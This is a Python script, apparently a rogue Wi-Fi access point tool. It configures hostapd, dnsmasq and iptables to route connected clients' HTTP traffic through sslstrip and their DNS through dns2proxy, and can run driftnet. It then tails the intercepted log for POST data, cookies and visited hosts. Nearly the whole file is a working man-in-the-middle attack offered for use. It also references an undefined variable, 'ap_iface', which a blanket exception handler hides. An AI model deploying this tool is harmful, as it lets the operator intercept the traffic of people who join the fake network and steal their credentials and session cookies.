import os
import time
import subprocess
import begin


def closingAndRestoring(ap, driftnet):
    print("\n\nStopping")
    try:
        os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
    except:
        pass
    try:
        os.system("sudo screen -S mitmap-sslstrip -X stuff '^C\n'")
    except:
        pass
    try:
        os.system("sudo screen -S mitmap-dns2proxy -X stuff '^C\n'")
    except:
        pass

    if driftnet:
        os.system("sudo screen -S mitmap-driftnet -X stuff '^C\n'")

    print("\nReseting config files")
    if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
        os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
    else:
        os.system("sudo rm /etc/NetworkManager/NetworkManager.conf")
    os.system("sudo service network-manager restart")
    os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
    os.system("sudo pkill dnsmasq")
    os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
    os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush -t nat")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")

    print("\nEverything closed and restored, script stopping")


@begin.start
def run(ap, net, ssid, channel, WPA2, driftnet = False):
    try:
        script_path = os.path.dirname(os.path.realpath(__file__)) + "/"
        os.system("sudo mkdir " + script_path + "logs > /dev/null 2>&1")
        os.system("sudo chmod 777 " + script_path + "logs")

        network_manager_cfg = "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + ap + "\n"
        print("NetworkManager.cfg backup and editing")
        os.system("sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
        f = open('/etc/NetworkManager/NetworkManager.conf', 'w')
        f.write(network_manager_cfg)
        f.close()

        print("\nRestarting NetworkManager")
        os.system("sudo ifconfig " + ap_iface + " up")
        os.system("sudo ifconfig " + ap + " up")


        print("\ndnsmasq.conf backup and update")
        os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
        dnsmasq_file = "port=0\n# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
        os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
        f = open('/etc/dnsmasq.conf', 'w')
        f.write(dnsmasq_file)
        f.close()


        hostapd_file = "interface=" + ap + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + WPA2 + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\n"
        print("\nNew hostpad.conf file")
        os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
        f = open('/etc/hostapd/hostapd.conf', 'w')
        f.write(hostapd_file)
        f.close()


        print("\nConfig iptables")
        os.system("sudo ifconfig " + ap + " up 10.0.0.1 netmask 255.255.255.0")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + net + " -j MASQUERADE")
        os.system("sudo iptables --append FORWARD --in-interface " + ap + " -j ACCEPT")


        print("\nStrating DNSMASQ server")
        os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
        os.system("sudo pkill dnsmasq")
        os.system("sudo dnsmasq")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000")
        os.system("sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")


        print("\nStarting Rogue AP")
        os.system("sudo screen -S mitmap-sslstrip -m -d python " + script_path + "sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/mitmap-sslstrip.log -a")
        os.system("sudo screen -S mitmap-dns2proxy -m -d sh -c 'cd " + script_path + "dns2proxy && python dns2proxy.py'")
        time.sleep(5)
        os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")

        if driftnet:
            print("\nStarting Driftnet")
            os.system("sudo screen -S mitmap-driftnet -m -d driftnet -i " + ap)

        time.sleep(10)

        while True:
            try:
                print("Collecting ...")
                time.sleep(1)
                os.system("sudo tail -f " + script_path + "logs/mitmap-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'")
            except KeyboardInterrupt:
                break


        closingAndRestoring(ap, driftnet)


    except:
        print("\nSometing wrong happened")
        

        closingAndRestoring(ap, driftnet)
